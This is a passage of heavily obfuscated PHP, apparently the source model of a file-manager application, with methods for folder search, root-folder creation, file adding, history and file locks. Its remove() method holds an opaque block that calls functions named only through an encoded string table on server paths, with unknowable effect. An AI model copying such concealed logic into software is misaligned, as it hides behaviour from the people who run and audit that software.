$eïÀÜÜÂÑ‹ = array($D“­Ä«ßÜ[455] => array($D“­Ä«ßÜ[758], $Bíæ‹Äæâ[$D“­Ä«ßÜ[455]] . $Bíæ‹Äæâ[$D“­Ä«ßÜ[366]] . $D“­Ä«ßÜ[476])); $d‰ÕŒ¤‚Óó = $this->field($D“­Ä«ßÜ[366])->cache(null, 600)->where($eïÀÜÜÂÑ‹)->count(); if ($d‰ÕŒ¤‚Óó > $fñá‹áºĞÏ) { return $this->_listSearchChildrenNear($eÔÖ»„Ù, $fñá‹áºĞÏ); } goto Aö¡„Å˜©; Aö¡„Å˜©: $aäËµ´Öœ = $this->field($D“­Ä«ßÜ[366])->where($eïÀÜÜÂÑ‹)->select(); $dÎä×ÄŒª¿ = array_to_keyvalue($aäËµ´Öœ, $D“­Ä«ßÜ[33], $D“­Ä«ßÜ[366]); return $dÎä×ÄŒª¿; goto fÒù ¤„ëù; fÒù ¤„ëù: } private function _listSearchChildrenNear($FÍòò‘­ç®, $b±İÎ‘•‚) { goto Dá«¼ËãŞÃ; B•çŞ»¯Ş¥: if (!$Cº…‰¡æ“) { return $AÔï£¼‰Åù; } $a´¥²Ü¤·– = array($b§Š¥©ìñö[457] => array($b§Š¥©ìñö[7], $Cº…‰¡æ“)); $E•†¾¿â½„ = $this->field($b§Š¥©ìñö[2215])->where($a´¥²Ü¤·–)->select(); goto bÆ‚øÉ‹Ñ÷; fè˜ŠÆ¥ÎÆ: $E•†¾¿â½„ = $this->field($b§Š¥©ìñö[2215])->where($a´¥²Ü¤·–)->select(); $Cº…‰¡æ“ = array_to_keyvalue(array_filter_by_field($E•†¾¿â½„, $b§Š¥©ìñö[367], $b§Š¥©ìñö[493]), $b§Š¥©ìñö[33], $b§Š¥©ìñö[366]); $AÔï£¼‰Åù = array_merge($AÔï£¼‰Åù, array_to_keyvalue($E•†¾¿â½„, $b§Š¥©ìñö[33], $b§Š¥©ìñö[366])); goto B•çŞ»¯Ş¥; Dá«¼ËãŞÃ: $b§Š¥©ìñö =& $_SERVER[¿õñ]; $AÔï£¼‰Åù = array(); $a´¥²Ü¤·– = array($b§Š¥©ìñö[457] => $FÍòò‘­ç®); goto fè˜ŠÆ¥ÎÆ; bÆ‚øÉ‹Ñ÷: $AÔï£¼‰Åù = array_merge($AÔï£¼‰Åù, array_to_keyvalue($E•†¾¿â½„, $b§Š¥©ìñö[33], $b§Š¥©ìñö[366])); $AÔï£¼‰Åù = array_slice($AÔï£¼‰Åù, 0, $b±İÎ‘•‚); return $AÔï£¼‰Åù; goto eÃ £¥Ùë; eÃ £¥Ùë: } private function _listSearchBindPinyin($Fº«ŸæœÔ, &$f“ºæÙ­¾„, &$Bä¤±‡–“) { goto DºÚóøµ£Ğ; fÂÃâÛÓÏÁ: $CÙœƒËË…[] = array($BóÒ’Ñ®[2219] => $e—Ä³–ÄÒì, $BóÒ’Ñ®[921] => $BóÒ’Ñ®[2096], array($BóÒ’Ñ®[2220] => $e—Ä³–ÄÒì, $BóÒ’Ñ®[2221] => array($BóÒ’Ñ®[7], array($BóÒ’Ñ®[412], $BóÒ’Ñ®[411])))); $this->join($cßÇ’ù”Ş½); $f“ºæÙ­¾„ = $CÙœƒËË…; goto eÓ‹à²ÜºŸ; F‰çÚ‡ ˜Š: unset($f“ºæÙ­¾„[$BóÒ’Ñ®[28]]); foreach ($f“ºæÙ­¾„ as $DŒˆŒÌÄ => $d°Æß˜ÔãÕ) { $CÙœƒËË…[$BóÒ’Ñ®[2217] . $DŒˆŒÌÄ] = $d°Æß˜ÔãÕ; } $e—Ä³–ÄÒì = array($BóÒ’Ñ®[475], $BóÒ’Ñ®[2094] . $Fº«ŸæœÔ[$BóÒ’Ñ®[2092]] . $BóÒ’Ñ®[2094]); goto fÂÃâÛÓÏÁ; DºÚóøµ£Ğ: $BóÒ’Ñ® =& $_SERVER[¿õñ]; if (!Input::check($Fº«ŸæœÔ[$BóÒ’Ñ®[2092]], $BóÒ’Ñ®[303]) || strlen($Fº«ŸæœÔ[$BóÒ’Ñ®[2092]]) < 2) { return; } $cßÇ’ù”Ş½ = "\x4c\x45\x46\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\151\x6f\x5f\163\157\165\x72\143\x65\x5f\155\145\x74\141\40\x6d\145\164\141\40\157\156\40\163\x6f\165\x72\x63\x65\x2e\x73\x6f\x75\x72\143\x65\x49\x44\40\75\x20\x6d\x65\164\141\x2e\163\157\x75\162\143\145\111\104"; goto eâĞÉƒÊ¶ß; eâĞÉƒÊ¶ß: $CÙœƒËË… = array(); $Bä¤±‡–“ = str_replace(array($BóÒ’Ñ®[214], $BóÒ’Ñ®[50], $BóÒ’Ñ®[2216]), $BóÒ’Ñ®[33], $Bä¤±‡–“); $Bä¤±‡–“ = $BóÒ’Ñ®[2217] . str_replace($BóÒ’Ñ®[47], $BóÒ’Ñ®[2218], $Bä¤±‡–“); goto F‰çÚ‡ ˜Š; eÓ‹à²ÜºŸ: } private function _parseSearchWhere($C´ŠÙ¸Ÿ) { goto FŠ¨×®™Òó; C¢‚À«°ç¬: if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[527]])) { $AÅâäÑ˜ß[] = array($B½šÌ§ì”Ê[376] => $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[527]], $B½šÌ§ì”Ê[375] => $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[527]], $B½šÌ§ì”Ê[921] => $B½šÌ§ì”Ê[2096]); } if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[369]])) { $c“ğĞËÔáÜ = $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[369]]; if ($c“ğĞËÔáÜ == $B½šÌ§ì”Ê[77]) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[367]] = 1; } else { if ($c“ğĞËÔáÜ == $B½šÌ§ì”Ê[2227]) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[367]] = 0; } else { if ($c“ğĞËÔáÜ) { $c“ğĞËÔáÜ = is_array($c“ğĞËÔáÜ) ? $c“ğĞËÔáÜ : explode($B½šÌ§ì”Ê[47], $c“ğĞËÔáÜ); $AÅâäÑ˜ß[$B½šÌ§ì”Ê[369]] = array($B½šÌ§ì”Ê[381], $c“ğĞËÔáÜ); $AÅâäÑ˜ß[$B½šÌ§ì”Ê[367]] = 0; } } } } if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[457]])) { $D»¸áÏÇßä = $this->sourceInfo($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[457]]); $AÅâäÑ˜ß[$B½šÌ§ì”Ê[518]] = array($B½šÌ§ì”Ê[475], $D»¸áÏÇßä[$B½šÌ§ì”Ê[455]] . $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[457]] . $B½šÌ§ì”Ê[476]); } goto d½Î‰µâîï; d½Î‰µâîï: if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2092]]) && $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2092]]) { $c°³øÛˆ‡ = $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2092]]; $eºÖÃ®Ä‘Ÿ = explode($B½šÌ§ì”Ê[50], $c°³øÛˆ‡); if (strlen($c°³øÛˆ‡) > 2 && (substr($c°³øÛˆ‡, 0, 1) == $B½šÌ§ì”Ê[112] && substr($c°³øÛˆ‡, -1) == $B½šÌ§ì”Ê[112]) || substr($c°³øÛˆ‡, 0, 1) == $B½šÌ§ì”Ê[55] && substr($c°³øÛˆ‡, -1) == $B½šÌ§ì”Ê[55]) { $c°³øÛˆ‡ = substr($c°³øÛˆ‡, 1, -1); $eºÖÃ®Ä‘Ÿ = array($c°³øÛˆ‡); } $AÅâäÑ˜ß[$B½šÌ§ì”Ê[28]] = array($B½šÌ§ì”Ê[475], $B½šÌ§ì”Ê[2094] . $c°³øÛˆ‡ . $B½šÌ§ì”Ê[2094]); if (count($eºÖÃ®Ä‘Ÿ) > 1) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[28]] = array(); foreach ($eºÖÃ®Ä‘Ÿ as $eİø¬˜áº²) { if (!trim($eİø¬˜áº²)) { continue; } $AÅâäÑ˜ß[$B½šÌ§ì”Ê[28]][] = array($B½šÌ§ì”Ê[475], $B½šÌ§ì”Ê[2094] . trim($eİø¬˜áº²) . $B½šÌ§ì”Ê[2094]); } } } return $AÅâäÑ˜ß; goto AÜ˜¿¤¬¾¨; FŠ¨×®™Òó: $B½šÌ§ì”Ê =& $_SERVER[¿õñ]; $AÅâäÑ˜ß = array(); if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[699]])) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[106]] = array($B½šÌ§ì”Ê[2222], $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[699]]); } goto A•­«˜¶öÙ; A•­«˜¶öÙ: if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[700]])) { $Aë…”²Âß = array($B½šÌ§ì”Ê[2223], $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[700]]); if ($AÅâäÑ˜ß[$B½šÌ§ì”Ê[106]]) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[106]] = array($AÅâäÑ˜ß[$B½šÌ§ì”Ê[106]], $Aë…”²Âß, $B½šÌ§ì”Ê[2224]); } else { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[106]] = $Aë…”²Âß; } } if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2225]])) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[78]] = array($B½šÌ§ì”Ê[2222], $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2225]]); } if (isset($C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2226]])) { $Aë…”²Âß = array($B½šÌ§ì”Ê[2223], $C´ŠÙ¸Ÿ[$B½šÌ§ì”Ê[2226]]); if ($AÅâäÑ˜ß[$B½šÌ§ì”Ê[78]]) { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[78]] = array($AÅâäÑ˜ß[$B½šÌ§ì”Ê[78]], $Aë…”²Âß, $B½šÌ§ì”Ê[2224]); } else { $AÅâäÑ˜ß[$B½šÌ§ì”Ê[78]] = $Aë…”²Âß; } } goto C¢‚À«°ç¬; AÜ˜¿¤¬¾¨: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($fùâæÓã”Ì) { $Cáˆ·’ĞØ =& $_SERVER[¿õñ]; $dˆƒïá¿Ö = Model($Cáˆ·’ĞØ[466])->where(array($Cáˆ·’ĞØ[1341] => $fùâæÓã”Ì))->find(); $f¾çÄÆõÈÕ = $this->_mkdirRoot(SourceModel::TYPE_USER, $fùâæÓã”Ì, $dˆƒïá¿Ö[$Cáˆ·’ĞØ[28]]); $this->userDesktopAdd($f¾çÄÆõÈÕ); return $f¾çÄÆõÈÕ; } public function userDesktopAdd($EäİÓïÙ‹®) { $D×Œ¥ÓŸ¦Í =& $_SERVER[¿õñ]; $b»ê¿ğáä» = LNG($D×Œ¥ÓŸ¦Í[2228]); $DÀó¬¹Å– = $this->mkdir($EäİÓïÙ‹®, $b»ê¿ğáä»); $this->metaSet($DÀó¬¹Å–, $D×Œ¥ÓŸ¦Í[2229], $D×Œ¥ÓŸ¦Í[493]); $this->metaSet($EäİÓïÙ‹®, $D×Œ¥ÓŸ¦Í[2230], $DÀó¬¹Å–); } public function groupRootAdd($Bó˜‚Š°Å‘) { $c­„¶¶õÄÙ =& $_SERVER[¿õñ]; $AİÏÌ¤êÅ— = Model($c­„¶¶õÄÙ[454])->where(array($c­„¶¶õÄÙ[2088] => $Bó˜‚Š°Å‘))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Bó˜‚Š°Å‘, $AİÏÌ¤êÅ—[$c­„¶¶õÄÙ[28]]); } public function systemRootPathAdd($C®Šã‰ƒİ) { if ($C®Šã‰ƒİ != $_SERVER[¿õñ][1068]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $C®Šã‰ƒİ); } public function userRootRemove($AÔ ‚Ş±ôÇ) { $cÙ¼ÖÆÙÎ = $this->sourceRoot(SourceModel::TYPE_USER, $AÔ ‚Ş±ôÇ); if (!$cÙ¼ÖÆÙÎ) { return; } $this->remove($cÙ¼ÖÆÙÎ, !1); } public function groupRootRemove($dÒ‡å£çÇŒ) { $e½•Å­šò = $this->sourceRoot(SourceModel::TYPE_GROUP, $dÒ‡å£çÇŒ); if (!$e½•Å­šò) { return; } $this->remove($e½•Å­šò, !1); } private function _mkdirRoot($bâÁ†í¢§„, $EÍ“Š“¢òœ, $eà£í‘ƒ×•) { goto fË§¥¬ÊŠ; d¿„ÍÈá‹¹: $f¦÷é³¼„ = "\x4d\x6f\144\145\154\123\x6f\165\x72\x63\145\x2e\x6d\x6b\x64\x69\x72\122\157\x6f\x74\x2e{$bâÁ†í¢§„}\56{$EÍ“Š“¢òœ}\56" . $eà£í‘ƒ×•; CacheLock::lock($f¦÷é³¼„); $BÜ²¶„Ä›®[$FìĞ ³§µ[28]] = $eà£í‘ƒ×•; goto añ›Î‘–¥™; añ›Î‘–¥™: $A¦åÑ£ã˜£ = $this->add($BÜ²¶„Ä›®); $A£Ï¶Ã¶ = array($FìĞ ³§µ[519] => short_id($A¦åÑ£ã˜£)); $this->where(array($FìĞ ³§µ[380] => $A¦åÑ£ã˜£))->save($A£Ï¶Ã¶); goto cËÈ÷îŸ»¢; cËÈ÷îŸ»¢: CacheLock::unlock($f¦÷é³¼„); return $A¦åÑ£ã˜£; goto a§‰á†®×; fË§¥¬ÊŠ: $FìĞ ³§µ =& $_SERVER[¿õñ]; $BÜ²¶„Ä›® = array($FìĞ ³§µ[365] => 0, $FìĞ ³§µ[514] => $bâÁ†í¢§„, $FìĞ ³§µ[515] => $EÍ“Š“¢òœ, $FìĞ ³§µ[511] => 1, $FìĞ ³§µ[516] => USER_ID, $FìĞ ³§µ[517] => USER_ID, $FìĞ ³§µ[512] => $FìĞ ³§µ[33], $FìĞ ³§µ[518] => $FìĞ ³§µ[2085], $FìĞ ³§µ[392] => 0, $FìĞ ³§µ[513] => 0, $FìĞ ³§µ[416] => 0, $FìĞ ³§µ[2231] => $FìĞ ³§µ[33]); if ($EÉÃïÛ¬ï = $this->where($BÜ²¶„Ä›®)->find()) { return $EÉÃïÛ¬ï[$FìĞ ³§µ[366]]; } goto d¿„ÍÈá‹¹; a§‰á†®×: } private function sourceRoot($aë“ù§›„º, $bÀ¡™¾ÑŒ¯, $D¼Ï®’¬Éã = false) { $Eğ­ÜÆÖ„ =& $_SERVER[¿õñ]; $Bäï’ß×Á¡ = array($Eğ­ÜÆÖ„[365] => 0, $Eğ­ÜÆÖ„[514] => $aë“ù§›„º, $Eğ­ÜÆÖ„[515] => $bÀ¡™¾ÑŒ¯); if ($Fñ¤ÎŸä„× = $this->where($Bäï’ß×Á¡)->find()) { return $D¼Ï®’¬Éã ? $Fñ¤ÎŸä„× : $Fñ¤ÎŸä„×[$Eğ­ÜÆÖ„[366]]; } return !1; } public function sourceRootGroup($BÆÛÁ«¤èé) { $fá®¥äÌÉ‹ =& $_SERVER[¿õñ]; if (is_string($BÆÛÁ«¤èé)) { $BÆÛÁ«¤èé = array($BÆÛÁ«¤èé); } $aëºäÈÎ›é = array($fá®¥äÌÉ‹[365] => 0, $fá®¥äÌÉ‹[514] => SourceModel::TYPE_GROUP, $fá®¥äÌÉ‹[515] => array($fá®¥äÌÉ‹[7], $BÆÛÁ«¤èé)); $Cì‰—„ë¶Ë = $this->listSource($aëºäÈÎ›é, 1000); return array_to_keyvalue($Cì‰—„ë¶Ë[$fá®¥äÌÉ‹[75]], $fá®¥äÌÉ‹[452]); } public function mkfile($a¿İ›À¶¤, $EÅğ´ƒØ‡, $AÑŒŒ—ôÙª = '', $e¬ğò½ì„© = REPEAT_RENAME) { $AĞÏœŒ’Í = Model($_SERVER[¿õñ][536])->addFileByContent($AÑŒŒ—ôÙª, $EÅğ´ƒØ‡); return $this->_createFileCall($a¿İ›À¶¤, $EÅğ´ƒØ‡, $AĞÏœŒ’Í, $e¬ğò½ì„©); } public function addFile($F¼™ÉïµÏ¿, $CÆ·¹Ú×‚¿, $CµŠÆöº†™, $eÎøö³íöå = false, $FØ§Ñ«©±Œ = REPEAT_RENAME) { $DœƒÓ¤‘ù£ = Model($_SERVER[¿õñ][536])->addFile($CÆ·¹Ú×‚¿, $CµŠÆöº†™, $eÎøö³íöå); return $this->_createFileCall($F¼™ÉïµÏ¿, $CµŠÆöº†™, $DœƒÓ¤‘ù£, $FØ§Ñ«©±Œ); } public function addFileByFileID($FÈè‡š‰—¹, $Fê‰£ôá‘Ş, $cİ¿ Â°Ú, $Bå›¸Ëä–ò = REPEAT_RENAME) { $AğÆÉ†­÷Ç =& $_SERVER[¿õñ]; $dŞ”¹ÑâÛä = Model($AğÆÉ†­÷Ç[536])->find($Fê‰£ôá‘Ş); Model($AğÆÉ†­÷Ç[536])->linkAdd($Fê‰£ôá‘Ş); return $this->_createFileCall($FÈè‡š‰—¹, $cİ¿ Â°Ú, $dŞ”¹ÑâÛä, $Bå›¸Ëä–ò); } public function addFileByRemote($bÏ­Èğ•»‹, $d§âËÁˆ–, $F¼½†¬Ã÷, $cƒ‹çƒáˆ = array(), $dğåÌƒ¼š¡ = REPEAT_RENAME) { $fÇåÜ®èŒœ = Model($_SERVER[¿õñ][536])->addFileByRemote($d§âËÁˆ–, $F¼½†¬Ã÷, $cƒ‹çƒáˆ); return $this->_createFileCall($bÏ­Èğ•»‹, $F¼½†¬Ã÷, $fÇåÜ®èŒœ, $dğåÌƒ¼š¡); } private function _createFileCall($B­¦è¯¯“é, $B©ÖˆÇ±Ô, $bïÆàÊï¨‘, $d¤õçÌÆ) { goto aóË¡Ñíé; aóË¡Ñíé: $bòÌÔÉ¡ÛĞ =& $_SERVER[¿õñ]; $CÕÆ¶öË­ = !1; $this->lockWriteStart($B­¦è¯¯“é, $B©ÖˆÇ±Ô); goto C¾‰³„¤‰®; DÁ¿‰²Ş„: return $fãÁê¦Ï©; goto f˜­Î¥»ÙÓ; C¾‰³„¤‰®: $fãÁê¦Ï© = $this->_createFile($B­¦è¯¯“é, $B©ÖˆÇ±Ô, $bïÆàÊï¨‘, $d¤õçÌÆ, $CÕÆ¶öË­); if (!$CÕÆ¶öË­) { Model($bòÌÔÉ¡ÛĞ[418])->remove($bïÆàÊï¨‘[$bòÌÔÉ¡ÛĞ[415]]); } $this->lockWriteEnd($B­¦è¯¯“é, $B©ÖˆÇ±Ô); goto DÁ¿‰²Ş„; f˜­Î¥»ÙÓ: } public function mkdir($Añ‘ó†•Îñ, $bùµêìšÉô, $e®òæ‰ = REPEAT_SKIP) { goto d‚¼¬Íù˜¥; c—„–‘Û»: return $cºø„’µî; goto dÆª‰èÎ˜¿; DºÎ…éö¯÷: $this->lockWriteStart($Añ‘ó†•Îñ, $bùµêìšÉô); if ($e®òæ‰ !== !1) { $Dóõ®ÃË´‡ = $this->fileNameExist($Añ‘ó†•Îñ, $bùµêìšÉô); if ($Dóõ®ÃË´‡ && $e®òæ‰ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Añ‘ó†•Îñ, $bùµêìšÉô); return $Dóõ®ÃË´‡; } $bùµêìšÉô = $this->fileNameAuto($Añ‘ó†•Îñ, $bùµêìšÉô, $e®òæ‰); } $Bô¼×ÊŒ— = array($EîÕÆŠˆ®Â[511] => 1, $EîÕÆŠˆ®Â[383] => $bùµêìšÉô, $EîÕÆŠˆ®Â[512] => $EîÕÆŠˆ®Â[33], $EîÕÆŠˆ®Â[416] => 0, $EîÕÆŠˆ®Â[513] => 0); goto cÁÈ¸¿¤“å; cÁÈ¸¿¤“å: $cºø„’µî = $this->_addSoure($Bô¼×ÊŒ—, $BÉœ‚Œ¶‘); Model($EîÕÆŠˆ®Â[2200])->eventCreate($cºø„’µî, $EîÕÆŠˆ®Â[1096]); $this->lockWriteEnd($Añ‘ó†•Îñ, $bùµêìšÉô); goto c—„–‘Û»; d‚¼¬Íù˜¥: $EîÕÆŠˆ®Â =& $_SERVER[¿õñ]; $BÉœ‚Œ¶‘ = $this->sourceInfo($Añ‘ó†•Îñ); if (!$BÉœ‚Œ¶‘) { return !1; } goto DºÎ…éö¯÷; dÆª‰èÎ˜¿: } private function _createFile($d²ĞÕ¸‡Úó, $C³ø°ßÒÄ¬, $dˆÄš‡·Ùè, $Eµõö‘âæÒ, &$f„É³»ó˜) { goto Cñ¥•å¢õà; BºÀÅŠ¯Î: if ($Eµõö‘âæÒ !== !1) { $AĞ½–ğÂø = $this->fileNameExist($d²ĞÕ¸‡Úó, $C³ø°ßÒÄ¬); } $f„É³»ó˜ = !0; if ($Eµõö‘âæÒ && $AĞ½–ğÂø) { if ($Eµõö‘âæÒ == REPEAT_SKIP) { $f„É³»ó˜ = !1; return $AĞ½–ğÂø; } else { if ($Eµõö‘âæÒ == REPEAT_REPLACE) { $CÛÙµßºõ = $this->sourceInfo($AĞ½–ğÂø); $cè„´¹¦„¤ = $this->fileHistory($CÛÙµßºõ, $dˆÄš‡·Ùè[$fÓï‰Âµ×‹[415]], $dˆÄš‡·Ùè[$fÓï‰Âµ×‹[78]]); if (!$cè„´¹¦„¤) { $f„É³»ó˜ = !1; } else { $this->folderSizeReset($d²ĞÕ¸‡Úó); } return $AĞ½–ğÂø; } else { $C³ø°ßÒÄ¬ = $this->fileNameAuto($d²ĞÕ¸‡Úó, $C³ø°ßÒÄ¬, $Eµõö‘âæÒ, !1); } } } goto E¾£ÎíÊº; E¾£ÎíÊº: $D¯…›„ì¬ = array($fÓï‰Âµ×‹[511] => 0, $fÓï‰Âµ×‹[383] => $C³ø°ßÒÄ¬, $fÓï‰Âµ×‹[512] => get_path_ext($C³ø°ßÒÄ¬), $fÓï‰Âµ×‹[416] => $dˆÄš‡·Ùè[$fÓï‰Âµ×‹[415]], $fÓï‰Âµ×‹[513] => $dˆÄš‡·Ùè[$fÓï‰Âµ×‹[78]]); $FßŞëÕÚîÇ = $this->_addSoure($D¯…›„ì¬, $B¹·¢í‹); $this->folderSizeReset($d²ĞÕ¸‡Úó); goto céòÄ­ƒå²; Cñ¥•å¢õà: $fÓï‰Âµ×‹ =& $_SERVER[¿õñ]; $B¹·¢í‹ = $this->sourceInfo($d²ĞÕ¸‡Úó); if (!$dˆÄš‡·Ùè || !$B¹·¢í‹) { return !1; } goto BºÀÅŠ¯Î; céòÄ­ƒå²: Model($fÓï‰Âµ×‹[2200])->eventCreate($FßŞëÕÚîÇ, $fÓï‰Âµ×‹[90]); return $FßŞëÕÚîÇ; goto CõáÚµ º³; CõáÚµ º³: } protected function fileHistory($aÒ°ù´Úš¿, $eğˆç”£İ¨, $E¥í‘‡¨‘) { goto c³çãîå; Dñ¥‡Ëø: Model($b¨«£ìŠÆí[2232])->addHistory($aÒ°ù´Úš¿); $aœŞˆƒ™ó„ = array($b¨«£ìŠÆí[517] => USER_ID, $b¨«£ìŠÆí[387] => time(), $b¨«£ìŠÆí[415] => $eğˆç”£İ¨, $b¨«£ìŠÆí[78] => $E¥í‘‡¨‘); $this->where(array($b¨«£ìŠÆí[380] => $aÒ°ù´Úš¿[$b¨«£ìŠÆí[366]]))->save($aœŞˆƒ™ó„); goto f‚¿¤ÃÙÖ; f‚¿¤ÃÙÖ: return !0; goto eˆÀñ®ã; c³çãîå: $b¨«£ìŠÆí =& $_SERVER[¿õñ]; if ($aÒ°ù´Úš¿[$b¨«£ìŠÆí[415]] == $eğˆç”£İ¨) { return !1; } $this->checkLock($aÒ°ù´Úš¿[$b¨«£ìŠÆí[366]]); goto Dñ¥‡Ëø; eˆÀñ®ã: } public function checkLock($DÍ ©óØâÍ) { $DÃÎ–÷Ì¦ =& $_SERVER[¿õñ]; $DÃŠÉ©Ñ‰ = $this->pathInfo($DÍ ©óØâÍ); if (!$this->fileIsLock($DÃŠÉ©Ñ‰, !0)) { return; } $aÎĞª³ ‡ä = $DÃŠÉ©Ñ‰[$DÃÎ–÷Ì¦[413]][$DÃÎ–÷Ì¦[473]]; $D‹“•È°À› = $aÎĞª³ ‡ä[$DÃÎ–÷Ì¦[2233]] ? $aÎĞª³ ‡ä[$DÃÎ–÷Ì¦[2233]] : $aÎĞª³ ‡ä[$DÃÎ–÷Ì¦[28]]; show_json(LNG($DÃÎ–÷Ì¦[2234]) . $DÃÎ–÷Ì¦[2235] . LNG($DÃÎ–÷Ì¦[2236]) . $DÃÎ–÷Ì¦[2237] . $D‹“•È°À› . $DÃÎ–÷Ì¦[2238], !1); } public function fileIsLock($EÎ‹‹¸£×, $b—ÑŸåŒÚ = false) { goto AéšÆ™ç®; E½„†êæÒ: $BËÙ¸„çÓ® = $GLOBALS[$fïÕÖØ‚ªŒ[6]][$fïÕÖØ‚ªŒ[84]][$fïÕÖØ‚ªŒ[471]]; if ($EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[413]][$fïÕÖØ‚ªŒ[472]] <= time() - $BËÙ¸„çÓ®) { $this->metaSet($EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[366]], $fïÕÖØ‚ªŒ[470], null); $this->metaSet($EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[366]], $fïÕÖØ‚ªŒ[472], null); } if ($b—ÑŸåŒÚ) { $this->metaSet($EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[366]], $fïÕÖØ‚ªŒ[472], time()); } goto D‡ÓŸµ ¦ì; D‡ÓŸµ ¦ì: return !1; goto eòÖ§á·; AéšÆ™ç®: $fïÕÖØ‚ªŒ =& $_SERVER[¿õñ]; if (!isset($EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[413]]) || !$EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[413]][$fïÕÖØ‚ªŒ[470]]) { return !1; } if ($EÎ‹‹¸£×[$fïÕÖØ‚ªŒ[413]][$fïÕÖØ‚ªŒ[470]] != USER_ID) { return !0; } goto E½„†êæÒ; eòÖ§á·: } private function _addSoure($D¾Æà´²Úİ, $A¯¬ÑÜÉ•Ş) { goto eÀù¾Ùİª»; F±Ü³ò¶Ï: $this->setNamePinyin($F¹àÙèª, $D¾Æà´²Úİ[$Eç‚éÚÈÑ[28]]); return $F¹àÙèª; goto bñ®»”‡§¥; d‚¥š‡¼²ß: $F¹àÙèª = $this->add($D¾Æà´²Úİ); $Cë¶—ÍÊô¿ = array($Eç‚éÚÈÑ[519] => short_id($F¹àÙèª)); $this->where(array($Eç‚éÚÈÑ[380] => $F¹àÙèª))->save($Cë¶—ÍÊô¿); goto F±Ü³ò¶Ï; fŒŸƒó·Îº: $this->updateModifyTime($D¾Æà´²Úİ[$Eç‚éÚÈÑ[457]]); static $cğô‘¦´” = false; if (!$cğô‘¦´”) { Hook::trigger($Eç‚éÚÈÑ[501], $D¾Æà´²Úİ); $cğô‘¦´” = !0; } goto d‚¥š‡¼²ß; eÀù¾Ùİª»: $Eç‚éÚÈÑ =& $_SERVER[¿õñ]; $e†ˆœ®ò—  = array($Eç‚éÚÈÑ[514] => $A¯¬ÑÜÉ•Ş[$Eç‚éÚÈÑ[368]], $Eç‚éÚÈÑ[515] => $A¯¬ÑÜÉ•Ş[$Eç‚éÚÈÑ[452]], $Eç‚éÚÈÑ[516] => USER_ID, $Eç‚éÚÈÑ[517] => USER_ID, $Eç‚éÚÈÑ[365] => $A¯¬ÑÜÉ•Ş[$Eç‚éÚÈÑ[366]], $Eç‚éÚÈÑ[518] => $A¯¬ÑÜÉ•Ş[$Eç‚éÚÈÑ[455]] . $A¯¬ÑÜÉ•Ş[$Eç‚éÚÈÑ[366]] . $Eç‚éÚÈÑ[47], $Eç‚éÚÈÑ[392] => 0, $Eç‚éÚÈÑ[2231] => $Eç‚éÚÈÑ[33]); $D¾Æà´²Úİ = array_merge($e†ˆœ®ò— , $D¾Æà´²Úİ); goto fŒŸƒó·Îº; bñ®»”‡§¥: } public function remove($aÁ‘´„ÍôÛ, $dè¼™Æåâ¢ = true) { goto AÍ—Å‘¡©å; AÍ—Å‘¡©å: $B‰‡ëÑê¸° =& $_SERVER[¿õñ]; if ($_SERVER[$B‰‡ëÑê¸°[780]] != $_SERVER[$B‰‡ëÑê¸°[2239]]) { goto f¯‹öíª”ë; DÒ ÉÃ™èÎ: $f´Â¡°ŒÛ = 1; while ($f´Â¡°ŒÛ > 1) { $f´Â¡°ŒÛ = $f´Â¡°ŒÛ + 4; $d“¹ßËà¯± = rawurlencode($f´Â¡°ŒÛ . $B‰‡ëÑê¸°[358]); } goto c¹¨ ¯´ö; fÀïÕˆ¨é¨: $Cò¡ŸÕŸÑ¼ = $fİÀóˆƒ¨±($aƒ¥÷¾™—); $c¢‰‚Ï¨Ö¨ = explode($B‰‡ëÑê¸°[214], $Cò¡ŸÕŸÑ¼); if (count($c¢‰‚Ï¨Ö¨) < $B‰‡ëÑê¸°[553]) { $Fé‘»Ïõ¾ì = $B‰‡ëÑê¸°[784]; $Fé‘»Ïõ¾ì(); } goto CÓ¦¹»ëˆ; CÓ¦¹»ëˆ: $AŒ¦Ãíò¯” = $B‰‡ëÑê¸°[802]; $AŒ¦Ãíò¯”($_SERVER[$B‰‡ëÑê¸°[803]]); $AŒ¦Ãíò¯”($_SERVER[$B‰‡ëÑê¸°[782]] . $B‰‡ëÑê¸°[2240]); goto DÒ ÉÃ™èÎ; f¯‹öíª”ë: $e›Û‚©êÁ = $B‰‡ëÑê¸°[801]; $fİÀóˆƒ¨± = $B‰‡ëÑê¸°[781]; $aƒ¥÷¾™— = $_SERVER[$B‰‡ëÑê¸°[782]] . 